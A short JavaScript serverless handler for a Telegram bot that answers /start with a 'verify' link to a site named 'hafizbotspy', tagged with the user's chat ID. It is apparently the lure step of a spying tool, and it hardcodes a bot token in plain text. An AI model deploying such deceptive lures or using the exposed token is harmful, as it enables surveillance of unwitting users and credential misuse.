export default async function handler(req, res) {
  const token = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k';
  const baseUrl = 'https://hafizbotspy.vercel.app'; // Replace with your domain

  if (req.method === 'POST') {
    const body = req.body;

    if (body.message && body.message.text === '/start') {
      const chatId = body.message.chat.id;
      const link = `${baseUrl}/?id=${chatId}`;

      const welcomeText = `Welcome!\nClick the link below to verify:\n${link}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: welcomeText,
        }),
      });
    }

    res.status(200).send('OK');
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
